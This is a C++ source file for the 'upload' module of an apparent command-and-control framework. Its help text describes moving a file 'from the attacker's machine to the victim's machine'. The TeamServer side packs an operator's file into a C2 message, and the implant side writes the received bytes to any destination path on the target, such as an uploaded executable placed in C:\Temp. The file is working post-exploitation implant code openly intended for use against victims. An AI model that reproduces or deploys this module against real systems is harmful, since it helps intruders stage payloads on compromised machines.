#include "Upload.hpp"

#include <cstring>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "upload";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Upload* UploadConstructor() 
{
    return new Upload();
}

#else

__attribute__((visibility("default"))) Upload* UploadConstructor() 
{
    return new Upload();
}

#endif


Upload::Upload()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Upload::~Upload()
{
}

std::string Upload::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Upload Module:\n";
    info += "Transfer a file from the attacker's machine to the victim's machine.\n";
    info += "The TeamServer resolves an operator upload artifact and sends its content to the remote target.\n";
    info += "\nUsage example:\n";
    info += " - upload toto.exe C:\\Temp\\toto.exe\n";
    info += "\nArguments:\n";
    info += " <artifact>      Uploaded artifact name or id on the TeamServer\n";
    info += " <destPath>      Destination path on the victim's machine\n";
#endif
    return info;
}

int Upload::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    std::vector<std::string> quoteRegroupedCmd = regroupStrings(splitedCmd);

    if (quoteRegroupedCmd.size() == 3 && quoteRegroupedCmd[0] == moduleName)
    {
        string inputFile = quoteRegroupedCmd[1];
        string outputFile = quoteRegroupedCmd[2];

        std::ifstream input(inputFile, std::ios::binary);
        if( input ) 
        {
            std::string buffer(std::istreambuf_iterator<char>(input), {});
            if (input.bad() || buffer.size() > MaxC2BinaryFieldSize)
            {
                c2Message.set_returnvalue("Failed: Couldn't read file.");
                return -1;
            }

            c2Message.set_instruction(quoteRegroupedCmd[0]);
            c2Message.set_inputfile(inputFile);
            c2Message.set_outputfile(outputFile);
            c2Message.set_data(std::move(buffer));
        }
        else
        {
            c2Message.set_returnvalue("Failed: Couldn't open file.");
            return -1;
        }

    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif

    return 0;
}

#define ERROR_OPEN_FILE 1 
#define ERROR_WRITE_FILE 2

int Upload::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string outputFile = c2Message.outputfile();
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd("");
    c2RetMessage.set_uuid(c2Message.uuid());
    c2RetMessage.set_data(std::string{});
    c2RetMessage.set_returnvalue({});

    std::ofstream output(outputFile, std::ios::binary | std::ios::trunc);
    if( output ) 
    {
        const std::string& buffer = c2Message.data();
        output.write(buffer.data(), static_cast<std::streamsize>(buffer.size()));
        output.close();
        if (output)
        {
            c2RetMessage.set_errorCode(0);
            c2RetMessage.set_returnvalue("Success.");
        }
        else
            c2RetMessage.set_errorCode(ERROR_WRITE_FILE);
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
    }

    return 0;
}

int Upload::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    errorMsg.clear();
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
        else if(errorCode==ERROR_WRITE_FILE)
            errorMsg = "Failed: Couldn't write file";
    }
#endif
    return 0;
}
